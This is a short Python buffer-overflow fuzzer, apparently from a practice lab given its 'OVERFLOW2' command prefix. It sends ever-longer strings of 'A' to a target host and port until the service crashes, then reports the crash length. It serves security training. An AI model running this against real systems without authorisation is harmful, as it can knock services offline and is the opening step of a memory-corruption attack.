#fuzzer.py <host> <port>
import socket,sys,time
ip=sys.argv[1]
port=int(sys.argv[2])
timeout=10
prefix='OVERFLOW2 '
string=prefix+'A'*100
while True:
		try:
			s=socket.socket()
			s.settimeout(timeout)
			s.connect((ip,port))
			s.recv(1024)
			print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
			s.send(bytes(string, "latin-1"))
			s.recv(1024)
		except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			sys.exit(0)
		string += 100 * "A"
		time.sleep(1)
